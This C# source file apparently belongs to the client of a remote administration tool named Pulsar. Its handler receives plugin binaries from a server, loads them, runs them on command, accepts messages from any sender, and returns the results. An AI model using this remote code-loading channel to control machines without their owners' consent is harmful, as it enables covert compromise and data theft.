using Pulsar.Client.Plugin;
using Pulsar.Plugin.Common;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Plugin;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using System;

namespace Pulsar.Client.Messages
{
    /// <summary>
    /// Handles plugin-related messages on the client side.
    /// </summary>
    public class PluginHandler : IMessageProcessor
    {
        private readonly ClientPluginManager _pluginManager;

        public PluginHandler()
        {
            _pluginManager = new ClientPluginManager();
        }

        public bool CanExecute(IMessage message) => message is DoPluginDistribution || message is DoPluginExecution;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoPluginDistribution distribution:
                    Execute(sender, distribution);
                    break;
                case DoPluginExecution execution:
                    Execute(sender, execution);
                    break;
            }
        }

        private void Execute(ISender sender, DoPluginDistribution message)
        {
            try
            {
                bool loaded = _pluginManager.LoadPlugin(message.PluginName, message.PluginContent);
                
                if (loaded)
                {
                    sender.Send(new SetStatus { Message = $"Plugin '{message.PluginName}' loaded successfully" });
                }
                else
                {
                    sender.Send(new SetStatus { Message = $"Failed to load plugin '{message.PluginName}'" });
                }
            }
            catch (Exception ex)
            {
                sender.Send(new SetStatus { Message = $"Error loading plugin '{message.PluginName}': {ex.Message}" });
            }
        }

        private void Execute(ISender sender, DoPluginExecution message)
        {
            try
            {
                if (message.Type == PluginOperationType.Execute)
                {
                    // Client executing plugin
                    byte[] result = _pluginManager.ExecutePlugin(message.PluginName, message.Output);
                    
                    if (result != null)
                    {
                        // Send response back to server
                        sender.Send(new DoPluginExecution
                        {
                            PluginName = message.PluginName,
                            WorkId = message.WorkId,
                            Type = PluginOperationType.Response,
                            Output = result
                        });
                    }
                    else
                    {
                        // Send error back to server
                        sender.Send(new DoPluginExecution
                        {
                            PluginName = message.PluginName,
                            WorkId = message.WorkId,
                            Type = PluginOperationType.Error,
                            Output = System.Text.Encoding.UTF8.GetBytes($"Plugin '{message.PluginName}' execution failed")
                        });
                    }
                }
            }
            catch (Exception ex)
            {
                // Send error back to server
                sender.Send(new DoPluginExecution
                {
                    PluginName = message.PluginName,
                    WorkId = message.WorkId,
                    Type = PluginOperationType.Error,
                    Output = System.Text.Encoding.UTF8.GetBytes($"Plugin execution error: {ex.Message}")
                });
            }
        }

        /// <summary>
        /// Gets the plugin manager instance.
        /// </summary>
        public ClientPluginManager PluginManager => _pluginManager;
    }
}
